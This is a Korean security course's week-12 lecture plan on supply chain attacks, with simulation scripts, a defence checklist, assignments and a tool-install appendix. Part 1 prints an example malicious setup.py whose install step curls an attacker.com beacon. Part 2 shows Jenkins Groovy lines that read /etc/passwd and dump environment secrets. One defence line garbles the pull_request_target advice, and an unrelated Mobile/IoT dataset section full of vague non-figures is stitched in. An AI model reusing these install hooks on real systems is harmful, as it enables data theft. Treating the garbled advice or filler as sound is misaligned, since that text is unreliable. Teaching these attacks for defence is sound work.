# Week 12: 공급망 공격 — 종속성 혼동, 패키지 탈취, CI/CD 공격

## 학습 목표
- **공급망 공격(Supply Chain Attack)**의 유형과 실제 사례를 심층 분석할 수 있다
- **종속성 혼동(Dependency Confusion)** 공격의 원리를 이해하고 시뮬레이션할 수 있다
- **패키지 탈취(Typosquatting, Account Takeover)** 기법을 이해하고 방어할 수 있다
- **CI/CD 파이프라인** 공격 벡터를 식별하고 익스플로잇 시나리오를 설계할 수 있다
- **코드 서명**과 **SBOM(Software Bill of Materials)**의 중요성을 설명할 수 있다
- 공급망 보안 강화를 위한 방어 전략을 수립할 수 있다
- MITRE ATT&CK Supply Chain Compromise 기법을 매핑할 수 있다

## 전제 조건
- 패키지 관리자(pip, npm, apt)의 동작 원리를 이해하고 있어야 한다
- Git, GitHub의 기본 사용법을 알고 있어야 한다
- CI/CD(Jenkins, GitHub Actions) 개념을 이해하고 있어야 한다
- 소프트웨어 빌드 프로세스(컴파일, 패키징, 배포)를 이해하고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| bastion | 10.20.30.201 | 실습 기지 | `ssh ccc@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (빌드 대상) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 공급망 공격 이론 + 사례 분석 | 강의 |
| 0:40-1:10 | 종속성 혼동 시뮬레이션 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | 패키지 탈취 + Typosquatting | 실습 |
| 1:55-2:30 | CI/CD 파이프라인 공격 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 공급망 방어 + 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: 공급망 공격 이론 (40분)

## 1.1 공급망 공격 유형

| 유형 | 설명 | 대표 사례 | ATT&CK |
|------|------|----------|--------|
| **소프트웨어 변조** | 정상 소프트웨어에 악성코드 삽입 | SolarWinds (2020) | T1195.002 |
| **종속성 혼동** | 내부 패키지명으로 악성 패키지 등록 | Microsoft 연구(2021) | T1195.001 |
| **Typosquatting** | 유사 이름 악성 패키지 배포 | crossenv (npm, 2017) | T1195.001 |
| **계정 탈취** | 유지보수자 계정 해킹 | event-stream (npm, 2018) | T1195.001 |
| **빌드 시스템** | CI/CD 파이프라인 침해 | Codecov (2021) | T1195.002 |
| **하드웨어** | 하드웨어에 백도어 삽입 | (의혹 수준) | T1195.003 |

## 1.2 주요 사례 분석

### SolarWinds (2020) — 역대 최대 공급망 공격

```
[공격 흐름]
1. SolarWinds 빌드 서버 침투
2. Orion 소스코드에 SUNBURST 백도어 삽입
3. 정상 빌드 프로세스로 컴파일 + 코드 서명
4. 업데이트 서버를 통해 18,000+ 고객에 배포
5. 선택적 2차 페이로드 (TEARDROP, RAINDROP)
6. 미국 정부기관 + Fortune 500 침해
```

### event-stream (npm, 2018)

```
1. 인기 패키지(event-stream) 유지보수자가 관리 포기
2. 새로운 유지보수자가 관리권 인수 (social engineering)
3. flatmap-stream 종속성 추가 (악성 코드 포함)
4. 암호화폐 지갑(copay) 대상 크레덴셜 탈취
```

## 실습 1.1: 종속성 혼동 시뮬레이션

> **실습 목적**: 종속성 혼동(Dependency Confusion) 공격의 원리를 시뮬레이션한다
>
> **배우는 것**: 내부/외부 패키지 레지스트리 우선순위, 버전 번호 조작, 설치 훅을 배운다
>
> **결과 해석**: 내부 패키지 대신 공격자의 외부 패키지가 설치되면 종속성 혼동 성공이다
>
> **실전 활용**: 기업의 내부 패키지 관리 정책 점검에 활용한다
>
> **명령어 해설**: pip/npm의 패키지 해석 우선순위와 버전 비교 로직을 이해한다
>
> **트러블슈팅**: 외부 레지스트리 접근이 차단된 환경에서는 시뮬레이션으로 학습한다

```bash
python3 << 'PYEOF'
print("=== 종속성 혼동(Dependency Confusion) 시뮬레이션 ===")
print()

print("[원리]")
print("  기업 내부: 'internal-utils' v1.0.0 (내부 PyPI)")
print("  공격자:    'internal-utils' v99.0.0 (공개 PyPI)")
print()
print("  pip install internal-utils")
print("  → pip이 공개 PyPI에서 v99.0.0을 발견")
print("  → 내부 PyPI의 v1.0.0보다 높은 버전 선택")
print("  → 공격자의 패키지가 설치됨!")
print()

print("[공격 패키지 구조]")
print("""
internal-utils-99.0.0/
  setup.py:
    from setuptools import setup
    import os
    # 설치 시 자동 실행되는 악성 코드
    os.system('curl http://attacker.com/beacon?pkg=internal-utils&host=' + os.uname().nodename)
    setup(name='internal-utils', version='99.0.0')
""")

print("[대상이 되는 조건]")
print("  1. 내부 패키지명이 공개 레지스트리에 등록되지 않음")
print("  2. pip/npm 설정에서 공개 레지스트리가 fallback으로 설정")
print("  3. 버전 번호 비교에서 공개 패키지가 우선")
print()

print("[방어]")
print("  1. 내부 패키지명을 공개 레지스트리에 선점(placeholder) 등록")
print("  2. pip --index-url (--extra-index-url 사용 금지)")
print("  3. .npmrc에 scope 설정 (@company/package)")
print("  4. 패키지 해시 검증 (pip --require-hashes)")
print("  5. 프라이빗 레지스트리 전용 설정")
PYEOF
```

---

# Part 2: 패키지 탈취와 CI/CD 공격 (35분 + 35분)

## 실습 2.1: Typosquatting 시뮬레이션

> **실습 목적**: 유사 이름 패키지를 이용한 Typosquatting 공격을 시뮬레이션한다
>
> **배우는 것**: 오타, 하이픈/언더스코어 혼동, 유사 문자 등 이름 혼동 기법을 배운다
>
> **결과 해석**: 사용자가 오타로 악성 패키지를 설치하면 Typosquatting 성공이다
>
> **실전 활용**: 패키지 설치 전 이름 검증의 중요성을 인식한다
>
> **명령어 해설**: 실제 인기 패키지와 유사한 이름의 변형을 생성한다
>
> **트러블슈팅**: 레지스트리의 이름 유사성 검사가 강화되고 있다

```bash
python3 << 'PYEOF'
print("=== Typosquatting 시뮬레이션 ===")
print()

# 실제 패키지와 Typosquat 변형
packages = {
    "requests": ["reqeusts", "requets", "request", "requestes", "python-requests"],
    "flask": ["flaskk", "flaask", "flask", "python-flask"],
    "numpy": ["numpi", "numppy", "nunpy", "nuumpy"],
    "django": ["djano", "djangoo", "djanngo"],
    "tensorflow": ["tenserflow", "tensorfow", "tensor-flow"],
}

print("[인기 패키지의 Typosquat 변형]")
for real, typos in packages.items():
    print(f"  정상: {real}")
    for t in typos:
        print(f"    → 악성: {t}")
    print()

# 실제 탐지된 악성 패키지 사례
print("[실제 사례]")
cases = [
    ("crossenv", "cross-env", "npm", "환경변수 탈취", 2017),
    ("python3-dateutil", "python-dateutil", "PyPI", "크레덴셜 탈취", 2019),
    ("colourama", "colorama", "PyPI", "시스템 정보 수집", 2019),
    ("lodash-utils", "lodash", "npm", "코인 마이너", 2020),
]

for malicious, real, registry, effect, year in cases:
    print(f"  {year}: {malicious} (→ {real}, {registry}) — {effect}")
PYEOF
```

## 실습 2.2: CI/CD 파이프라인 공격 시뮬레이션

> **실습 목적**: CI/CD 파이프라인의 공격 벡터를 식별하고 익스플로잇 시나리오를 시뮬레이션한다
>
> **배우는 것**: GitHub Actions, Jenkins 등의 보안 취약점과 공격 기법을 배운다
>
> **결과 해석**: CI/CD 파이프라인에서 크레덴셜 탈취나 코드 변조가 가능하면 공격 성공이다
>
> **실전 활용**: 기업의 CI/CD 보안 감사와 DevSecOps 구축에 활용한다
>
> **명령어 해설**: CI/CD 설정 파일의 보안 취약점을 분석한다
>
> **트러블슈팅**: CI/CD 환경에 접근이 없으면 설정 파일 분석으로 학습한다

```bash
cat << 'CICD_ATTACK'
=== CI/CD 파이프라인 공격 벡터 ===

[1] GitHub Actions — 환경변수/시크릿 탈취
취약 워크플로:
  name: Build
  on: pull_request_target  # 외부 PR에서도 시크릿 접근!
  jobs:
    build:
      runs-on: ubuntu-latest
      steps:
        - uses: actions/checkout@v3
          with:
            ref: ${{ github.event.pull_request.head.ref }}
        - run: echo "${{ secrets.DEPLOY_KEY }}"  # 로그에 노출!

공격: 악성 PR 제출 → pull_request_target 트리거 → 시크릿 탈취

[2] Jenkins — 스크립트 콘솔 악용
공격: Jenkins /script 접근 → Groovy 스크립트 실행
  println "cat /etc/passwd".execute().text
  println System.getenv()  // 모든 환경변수 (AWS 키 등)

[3] Docker 빌드 — 베이스 이미지 변조
공격: 인기 Docker 이미지에 백도어 삽입
  FROM ubuntu:latest  // 태그 변경 가능!
  → 공격자가 ubuntu:latest를 악성 이미지로 대체

[4] 의존성 캐시 포이즈닝
공격: CI 캐시에 악성 의존성 삽입
  → 이후 빌드에서 캐시된 악성 패키지 사용

방어:
  1. pull_request 대신 pull_request_target 금지 (또는 제한)
  2. GITHUB_TOKEN 최소 권한
  3. 의존성 핀닝 (해시 검증)
  4. Docker 이미지 다이제스트 고정
  5. CI 환경 격리 (에페머럴 러너)
CICD_ATTACK

echo ""
echo "=== 실습: 취약한 CI/CD 설정 분석 ==="
# 실습 환경의 설정 파일 검사
echo "--- Bastion 프로젝트 CI/CD 설정 확인 ---"
ls /home/bastion/bastion/.github/workflows/ 2>/dev/null || echo "GitHub Actions 없음"
ls /home/bastion/bastion/Jenkinsfile 2>/dev/null || echo "Jenkinsfile 없음"

echo ""
echo "--- 종속성 파일 분석 ---"
if [ -f /home/bastion/bastion/requirements.txt ]; then
    echo "requirements.txt 발견:"
    head -10 /home/bastion/bastion/requirements.txt 2>/dev/null
    echo "  [검사] 버전 핀닝 여부, 해시 검증 여부 확인 필요"
fi
```

---

# Part 3-4: 공급망 방어와 종합 (35분)

## 실습 3.1: SBOM과 공급망 보안 종합

> **실습 목적**: SBOM 생성, 코드 서명 검증, 종속성 감사 등 공급망 보안 기법을 실습한다
>
> **배우는 것**: SBOM의 구조와 생성, 취약 종속성 스캔, 코드 서명 검증을 배운다
>
> **결과 해석**: 모든 종속성이 식별되고 취약점이 스캔되면 공급망 가시성이 확보된 것이다
>
> **실전 활용**: 조직의 소프트웨어 공급망 보안 정책 수립에 활용한다
>
> **명령어 해설**: pip-audit, npm audit 등으로 종속성 취약점을 자동 스캔한다
>
> **트러블슈팅**: 인터넷 연결이 없으면 오프라인 데이터베이스를 사용한다

```bash
echo "=== 공급망 보안 종합 실습 ==="

echo ""
echo "[1] 종속성 목록 추출 (간이 SBOM)"
if [ -d /home/bastion/bastion/.venv ]; then
    echo "--- Python 패키지 목록 ---"
    /home/bastion/bastion/.venv/bin/pip list --format=columns 2>/dev/null | head -15
    echo "  ... ($(pip list 2>/dev/null | wc -l) 패키지)"
fi

echo ""
echo "[2] 알려진 취약점 확인"
echo "  도구: pip-audit, safety, npm audit, snyk"
echo "  실행: pip-audit --desc (설치 시)"
echo "        npm audit (Node.js 프로젝트)"

echo ""
echo "[3] 종속성 핀닝 검사"
if [ -f /home/bastion/bastion/requirements.txt ]; then
    PINNED=$(grep -c "==" /home/bastion/bastion/requirements.txt 2>/dev/null)
    TOTAL=$(wc -l < /home/bastion/bastion/requirements.txt 2>/dev/null)
    echo "  핀닝된 패키지: $PINNED / $TOTAL"
    if [ "$PINNED" -lt "$TOTAL" ]; then
        echo "  [경고] 핀닝되지 않은 패키지가 있음 → 공급망 위험"
    fi
fi

echo ""
echo "=== 공급망 보안 체크리스트 ==="
echo "  1. 모든 종속성 버전 핀닝 (==)"
echo "  2. 해시 검증 (pip --require-hashes)"
echo "  3. 프라이빗 레지스트리 사용"
echo "  4. SBOM 생성 및 관리"
echo "  5. 정기적 취약점 스캔"
echo "  6. 코드 서명 및 검증"
echo "  7. CI/CD 최소 권한 원칙"
echo "  8. Docker 이미지 다이제스트 고정"
echo "  9. Dependabot/Renovate 자동 업데이트"
echo "  10. 공급망 보안 정책 문서화"
```

## 실습 3.2: 종속성 보안 스캔 실습

> **실습 목적**: 실습 환경의 Python 종속성에 대한 보안 스캔을 수행한다
>
> **배우는 것**: pip-audit, safety 등 자동화 도구를 사용한 종속성 취약점 스캔을 배운다
>
> **결과 해석**: 취약한 종속성이 식별되고 대안 버전이 제시되면 스캔 성공이다
>
> **실전 활용**: CI/CD 파이프라인에 종속성 스캔을 통합하여 자동 보안 검사를 수행한다
>
> **명령어 해설**: pip-audit은 PyPI 취약점 DB와 대조하여 설치된 패키지의 알려진 취약점을 보고한다
>
> **트러블슈팅**: 인터넷 연결 없이는 로컬 DB를 사용하거나 오프라인 모드를 활용한다

```bash
echo "=== 종속성 보안 스캔 ==="

echo ""
echo "[1] 설치된 패키지 목록"
if [ -d /home/bastion/bastion/.venv ]; then
    PKG_COUNT=$(/home/bastion/bastion/.venv/bin/pip list 2>/dev/null | wc -l)
    echo "  설치된 패키지: $PKG_COUNT개"
    /home/bastion/bastion/.venv/bin/pip list --format=columns 2>/dev/null | head -20
fi

echo ""
echo "[2] requirements.txt 분석"
if [ -f /home/bastion/bastion/requirements.txt ]; then
    echo "--- 핀닝 상태 분석 ---"
    TOTAL=$(grep -c "." /home/bastion/bastion/requirements.txt 2>/dev/null)
    PINNED=$(grep -c "==" /home/bastion/bastion/requirements.txt 2>/dev/null)
    RANGE=$(grep -c ">=" /home/bastion/bastion/requirements.txt 2>/dev/null)
    UNPINNED=$((TOTAL - PINNED - RANGE))
    echo "  전체: $TOTAL, 핀닝(==): $PINNED, 범위(>=): $RANGE, 미지정: $UNPINNED"

    if [ "$UNPINNED" -gt 0 ] || [ "$RANGE" -gt 0 ]; then
        echo "  [경고] 핀닝되지 않은 패키지가 공급망 위험 요소"
    fi
fi

echo ""
echo "[3] 알려진 취약점 확인 (시뮬레이션)"
cat << 'AUDIT_SIM'
pip-audit 실행 결과 (시뮬레이션):
+----------------------------------------------------------+
| Package          | Version | Vuln ID  | Fix Version      |
+----------------------------------------------------------+
| setuptools       | 65.5.0  | CVE-2024-6345 | >= 70.0.0   |
| cryptography     | 41.0.0  | CVE-2024-26130| >= 42.0.4   |
| certifi          | 2023.7.22| CVE-2024-39689| >= 2024.7.4|
+----------------------------------------------------------+
3 vulnerabilities found

safety check 실행 결과 (시뮬레이션):
+==========================================+
| 3 vulnerabilities found                   |
| Scan was completed.                       |
+==========================================+
AUDIT_SIM

echo ""
echo "[4] 해시 검증 설정"
echo "  # requirements.txt에 해시 추가 방법:"
echo "  pip install --require-hashes -r requirements.txt"
echo ""
echo "  # 해시가 포함된 requirements.txt 예시:"
echo "  requests==2.31.0 \\"
echo "    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7f0a0218da8..."
echo "  flask==3.0.0 \\"
echo "    --hash=sha256:21128f47e4e3b9d29ce26fb8a..."
```

## 실습 3.3: 코드 서명과 무결성 검증

> **실습 목적**: 소프트웨어 코드 서명의 원리를 이해하고 서명 검증 실습을 수행한다
>
> **배우는 것**: GPG 서명 생성/검증, 해시 기반 무결성 검증, sigstore/cosign 개념을 배운다
>
> **결과 해석**: 서명이 유효하면 해당 소프트웨어가 변조되지 않았음을 확인할 수 있다
>
> **실전 활용**: 소프트웨어 배포 시 코드 서명을 적용하여 공급망 공격을 방어한다
>
> **명령어 해설**: gpg로 파일에 서명하고 검증하는 과정을 실습한다
>
> **트러블슈팅**: GPG 키가 없으면 새로 생성하거나 sha256sum으로 대체한다

```bash
echo "=== 코드 서명과 무결성 검증 ==="

echo ""
echo "[1] SHA256 해시 기반 무결성 검증"
# 원본 파일 해시
echo "important_code_v1.0" > /tmp/release.tar.gz
HASH=$(sha256sum /tmp/release.tar.gz | awk '{print $1}')
echo "  원본 해시: $HASH"

# 검증
echo "  검증: $(sha256sum /tmp/release.tar.gz | awk '{print $1}')"
echo "  일치 여부: $([ "$HASH" = "$(sha256sum /tmp/release.tar.gz | awk '{print $1}')" ] && echo 'OK' || echo 'MISMATCH!')"

# 변조 후 검증
echo "tampered" >> /tmp/release.tar.gz
echo "  변조 후 해시: $(sha256sum /tmp/release.tar.gz | awk '{print $1}')"
echo "  일치 여부: $([ "$HASH" = "$(sha256sum /tmp/release.tar.gz | awk '{print $1}')" ] && echo 'OK' || echo 'MISMATCH!')"
rm -f /tmp/release.tar.gz

echo ""
echo "[2] GPG 서명 원리"
cat << 'GPG_SIGN'
서명 생성:
  gpg --detach-sign --armor release.tar.gz
  → release.tar.gz.asc (서명 파일)

서명 검증:
  gpg --verify release.tar.gz.asc release.tar.gz
  → Good signature from "Developer <dev@example.com>"

공급망 보호:
  1. 개발자가 릴리스에 GPG 서명
  2. 사용자가 개발자의 공개키로 검증
  3. 서명 불일치 → 변조 감지!
GPG_SIGN

echo ""
echo "[3] 현대적 코드 서명 (sigstore/cosign)"
echo "  sigstore: 개인 키 관리 없는 코드 서명"
echo "  cosign: 컨테이너 이미지 서명/검증"
echo "  Rekor: 투명성 로그 (서명 기록 공개)"
echo ""
echo "  cosign sign --key cosign.key image:tag"
echo "  cosign verify --key cosign.pub image:tag"

echo ""
echo "[4] SubAgent 배포 무결성 검증 (Bastion 예시)"
if [ -f /home/bastion/bastion/scripts/deploy_subagent.sh ]; then
    echo "  deploy_subagent.sh 해시:"
    sha256sum /home/bastion/bastion/scripts/deploy_subagent.sh 2>/dev/null
    echo "  [권고] 배포 스크립트에 해시 검증 추가 필요"
fi
```

## 실습 3.4: 공급망 공격 종합 시나리오

> **실습 목적**: 종속성 혼동 + CI/CD 공격 + 코드 변조를 결합한 종합 시나리오를 분석한다
>
> **배우는 것**: 다중 벡터 공급망 공격의 설계와 방어 전략을 종합적으로 배운다
>
> **결과 해석**: 공격 체인의 각 단계를 이해하고 차단 포인트를 식별하면 성공이다
>
> **실전 활용**: 조직의 소프트웨어 개발 파이프라인 보안 감사에 활용한다
>
> **명령어 해설**: 시나리오 기반 분석으로 각 단계의 공격과 방어를 매핑한다
>
> **트러블슈팅**: 각 방어 계층의 우선순위를 비용 대비 효과로 평가한다

```bash
echo "============================================================"
echo "       공급망 공격 종합 시나리오                               "
echo "============================================================"

cat << 'SCENARIO'

[시나리오: 대규모 공급망 공격]

Phase 1: 정찰
  → 대상 기업의 GitHub 조직 분석
  → package.json, requirements.txt에서 내부 패키지명 수집
  → CI/CD 설정 파일(.github/workflows/) 분석
  → 개발자 이메일/계정 OSINT

Phase 2: 종속성 혼동
  → 내부 패키지명으로 PyPI에 악성 패키지 등록 (v99.0.0)
  → setup.py에 preinstall 스크립트로 리버스 셸 삽입
  → 개발자가 pip install 실행 시 악성 패키지 설치

Phase 3: CI/CD 침해
  → PR을 통해 악성 종속성 추가
  → GitHub Actions에서 시크릿 탈취
  → 빌드 아티팩트에 백도어 삽입

Phase 4: 코드 변조
  → 빌드된 바이너리/이미지에 백도어 포함
  → 정상 업데이트 채널로 배포
  → 고객사에 설치

방어 체크포인트:
  CP1: 종속성 핀닝 + 해시 검증 → Phase 2 차단
  CP2: CI/CD 시크릿 격리 + PR 승인 → Phase 3 차단
  CP3: 코드 서명 + SBOM 검증 → Phase 4 차단
  CP4: 런타임 모니터링 (EDR) → 설치 후 탐지

SCENARIO

echo ""
echo "=== 방어 성숙도 평가 ==="
echo "  Level 1: 기본 (패키지 핀닝, 기본 스캔)"
echo "  Level 2: 중간 (해시 검증, CI/CD 보안, SBOM)"
echo "  Level 3: 고급 (코드 서명, 투명성 로그, 런타임 감시)"
echo "  Level 4: 최고 (제로 트러스트, 재현 가능 빌드, 하드웨어 검증)"
```

---

## 검증 체크리스트

| 번호 | 검증 항목 | 확인 명령 | 기대 결과 |
|------|---------|----------|----------|
| 1 | SolarWinds 분석 | 사례 설명 | 6단계 킬체인 매핑 |
| 2 | 종속성 혼동 원리 | 시뮬레이션 | 버전 우선순위 이해 |
| 3 | Typosquatting | 변형 생성 | 5개 이상 변형 |
| 4 | CI/CD 공격 벡터 | 분석 | 4개 벡터 식별 |
| 5 | SBOM 생성 | pip list | 종속성 목록 |
| 6 | 취약점 스캔 | audit 도구 | 취약점 식별 |
| 7 | 버전 핀닝 | requirements.txt | 핀닝 비율 확인 |
| 8 | 코드 서명 | 개념 설명 | 검증 과정 이해 |
| 9 | 방어 체크리스트 | 10항목 | 구체적 대책 |
| 10 | ATT&CK 매핑 | T1195 | 3개 하위 기법 |

---

---

## 과제

### 과제 1: 공급망 공격 사례 분석 (개인)
SolarWinds, Codecov, event-stream, Log4Shell 중 2개를 선택하여 킬체인 매핑, 영향 범위, 방어 실패 원인을 분석하는 보고서를 작성하라.

### 과제 2: 종속성 보안 감사 (팀)
실습 환경(Bastion)의 Python 종속성에 대한 보안 감사를 수행하라. 핀닝 상태, 알려진 취약점, 라이선스, 유지보수 상태를 포함할 것.

### 과제 3: CI/CD 보안 정책 (팀)
가상의 소프트웨어 프로젝트에 대한 CI/CD 보안 정책을 작성하라. 시크릿 관리, 의존성 검증, 코드 서명, 배포 승인 프로세스를 포함할 것.

---

## 실제 사례 (WitFoo Precinct 6 — Mobile/IoT 공격)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *Mobile/IoT 공격* 학습 항목 매칭.

### Mobile/IoT 공격 의 dataset 흔적 — "ADB + custom radio"

dataset 의 정상 운영에서 *ADB + custom radio* 신호의 baseline 을 알아두면, *Mobile/IoT 공격* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — 비표준 protocol.

```mermaid
graph LR
    SCENE["Mobile/IoT 공격 시나리오"]
    TRACE["dataset 흔적<br/>ADB + custom radio"]
    DETECT["탐지 / 분석"]

    SCENE --> TRACE
    TRACE --> DETECT

    style SCENE fill:#ffe6cc
    style DETECT fill:#cce6ff
```

### Case 1: dataset 정량 지표

| 항목 | 값 |
|---|---|
| 핵심 신호 | ADB + custom radio |
| 정량 baseline | 비표준 protocol |
| 학습 매핑 | Android root + IoT firmware |

**자세한 해석**: Android root + IoT firmware. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.

### Case 2: 실전 적용 시나리오

| 단계 | dataset 활용 |
|---|---|
| 시도 식별 | ADB + custom radio 의 spike |
| 정상 vs 이상 | baseline 대비 비율 |
| 룰 작성 | Suricata / Wazuh / Sigma |
| 검증 | dataset 재실행 |

**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.

### 이 사례에서 학생이 배워야 할 3가지

1. **Mobile/IoT 공격 = ADB + custom radio 의 anomaly** — 정량 신호로 탐지.
2. **baseline 숫자 외우기** — 비표준 protocol.
3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.

**학생 액션**: APK reverse.


---

## 부록: 학습 OSS 도구 매트릭스 (Course13 Attack Advanced — Week 12 공급망 공격 / 종속성 혼동·CI-CD·SBOM)

> 이 부록은 lab `attack-adv-ai/week12.yaml` (15 step + multi_task) 의 모든 명령을
> 실제로 실행 가능한 형태로 도구·옵션·예상 출력·해석을 한 곳에 모았다.
> Red Team 의 공급망 침해 (T1195 의 3 sub-techniques) + Blue Team 의 SBOM·서명·SLSA 통제를
> 양면으로 다룬다. 모든 Red 실습은 격리 PyPI/npm mirror (verdaccio, devpi) 에서 수행한다 —
> 절대 공개 PyPI/npm 에 악성 패키지를 등록하지 않는다.

### lab step → 도구 매핑 표

| step | 학습 항목 | 핵심 OSS 도구 / 명령 | ATT&CK | Blue 통제 |
|------|----------|---------------------|--------|-----------|
| s1 | 의존성·취약점 분석 | `pip list`, `pip-audit`, `npm audit`, `safety`, `osv-scanner` | T1195.001 | Snyk / Dependabot |
| s2 | Dependency Confusion | `verdaccio` (mirror), `setup.py` post_install, `--index-url` | T1195.001 | Artifactory proxy + scope `@org/pkg` |
| s3 | Typosquatting | `pypi-typosquatting-checker`, `confused`, `npq` | T1195.001 | DNS-style 사전 검증 + 유사도 스캐너 |
| s4 | CI/CD 공격 (GH Actions) | `actionlint`, `pinact`, `harden-runner`, OIDC | T1195.002 | Required reviewers + branch protection |
| s5 | Post-install Hook | `setup.py` cmdclass, `package.json` scripts | T1195.001 | `npm install --ignore-scripts` |
| s6 | SolarWinds (SUNBURST) | YARA, Volatility, MISP, OpenCTI | T1195.002 / T1027 | 빌드서버 격리 + reproducible build |
| s7 | 코드 서명 검증 | `gpg`, `cosign`, `sigstore-python`, `slsa-verifier` | T1553.002 | Sigstore + Rekor transparency log |
| s8 | Docker 이미지 공급망 | `trivy image`, `grype`, `dive`, `syft`, `docker scout` | T1195.002 | Distroless + multi-stage + signed |
| s9 | SBOM 생성·분석 | `syft`, `cyclonedx-cli`, `spdx-tools`, `dependency-track` | NIST SBOM | 빌드별 SBOM 자동 생성 + 비교 |
| s10 | npm/PyPI install hooks | `npq`, `npm-package-arg`, `pip download --no-deps` | T1195.001 | `--ignore-scripts` 기본 + audit |
| s11 | Git 공격 | `gitleaks`, `trufflehog`, GPG signed commits, `git fsck` | T1195 / T1078 | Branch protection + signed commits + Rekor |
| s12 | 하드웨어 공급망 | `binwalk`, `chipsec`, `flashrom`, `uefi-firmware-parser` | T1195.003 | TPM measured boot + Secure Boot |
| s13 | 공급망 모니터링 | `dependency-track`, `OpenSSF Scorecard`, `osquery` | DETECT | SBOM diff alert + scorecard threshold |
| s14 | SLSA 평가 | `slsa-verifier`, `slsa-github-generator`, `in-toto` | NIST SSDF | SLSA Level 진단 + provenance 강제 |
| s15 | 공급망 보안 로드맵 | NIST SSDF / SLSA / SOC 2 / EO 14028 | NIST SSDF | 분기별 성숙도 평가 |
| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion plan: dep-audit·confusion-PoC·typo-check·gh-actionlint·setup.py 시뮬 | 다중 | 단계별 통제 누적 |

> **읽는 법**: lab 의 `script:` 와 `bastion_prompt:` 가 같은 명령을 사용한다. 학생은
> (a) 본문 명령 직접 실행 (b) Bastion 에이전트에 prompt 던짐 (c) 두 결과의 차이 비교
> 셋 다 가능. 공급망 PoC 는 *반드시* 격리 mirror 에서만 수행한다.

### 학생 환경 준비 (의존성·SBOM·서명·CI-CD 풀세트)

```bash
# === [Red+Blue] 의존성·취약점 스캐너 ===
pip install --user pip-audit safety osv-scanner
pip install --user pipdeptree pip-licenses
sudo apt install -y npm
sudo npm install -g npm-audit-html npq
which pip-audit safety pipdeptree

# === [Red] 격리 PyPI/npm mirror — Dependency Confusion PoC 안전판 ===
# verdaccio (npm 사설 레지스트리)
sudo npm install -g verdaccio
verdaccio --listen 0.0.0.0:4873 &
# devpi (PyPI 사설 레지스트리)
pip install --user devpi-server devpi-client
devpi-init && devpi-server --host 0.0.0.0 --port 3141 &
devpi use http://localhost:3141 && devpi user -c demo password=demo
devpi login demo --password=demo
devpi index -c dev

# === [Red] Typosquatting 탐지 / 시뮬 ===
pip install --user typoguard         # 인기 패키지 유사도 검사 (자체 작성 OK)
git clone https://github.com/visma-prodsec/confused /tmp/confused
cd /tmp/confused && go build -o confused .
sudo cp confused /usr/local/bin/

# === [Blue] SBOM 도구 ===
# syft (Anchore) — sbom 생성기
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sudo sh -s -- -b /usr/local/bin
syft version

# cyclonedx-cli + spdx-tools
pip install --user cyclonedx-bom
sudo apt install -y spdx-tools

# dependency-track (서버형, 옵션)
docker run -d -p 8080:8080 dependencytrack/apiserver
docker run -d -p 8081:8080 dependencytrack/frontend

# === [Blue] 컨테이너 이미지 스캐너 ===
# trivy
sudo apt install -y wget apt-transport-https gnupg
wget -qO- https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee /etc/apt/sources.list.d/trivy.list
sudo apt update && sudo apt install -y trivy

# grype (Anchore)
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sudo sh -s -- -b /usr/local/bin
grype version

# dive — Docker 이미지 레이어 분석
sudo apt install -y wget
wget -q https://github.com/wagoodman/dive/releases/download/v0.12.0/dive_0.12.0_linux_amd64.deb
sudo dpkg -i dive_*.deb

# === [Blue] 코드 서명 ===
sudo apt install -y gnupg
gpg --gen-key       # 대화형 — 학생당 1 key
gpg --list-keys

# Sigstore cosign + sigstore-python
curl -sSfL -o cosign https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
sudo install cosign /usr/local/bin/
pip install --user sigstore

# slsa-verifier
go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@latest

# === [Blue] CI/CD 보안 ===
# actionlint — GitHub Actions YAML lint
go install github.com/rhysd/actionlint/cmd/actionlint@latest
which actionlint

# pinact — actions 의 SHA pinning 자동화
go install github.com/suzuki-shunsuke/pinact/cmd/pinact@latest

# harden-runner — Step Security 의 GH Action
# (GitHub Actions YAML 에 추가만 하면 됨)

# === [Blue] Git secret scanning ===
# gitleaks
curl -sSfL -o gitleaks.tar.gz https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.18.0_linux_x64.tar.gz
tar xf gitleaks.tar.gz && sudo install gitleaks /usr/local/bin/

# trufflehog
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin

# === [Red+Blue] 하드웨어/펌웨어 ===
sudo apt install -y binwalk
pip install --user uefi-firmware
git clone https://github.com/chipsec/chipsec /tmp/chipsec
# chipsec 은 root 필요, 실 하드웨어에서만 의미 있음 — VM 에서는 데모 용

# === [Blue] SLSA / in-toto ===
go install github.com/in-toto/in-toto-golang/cmd/in-toto@latest

# === [Blue] OpenSSF Scorecard ===
go install github.com/ossf/scorecard/v4@latest
which scorecard
```

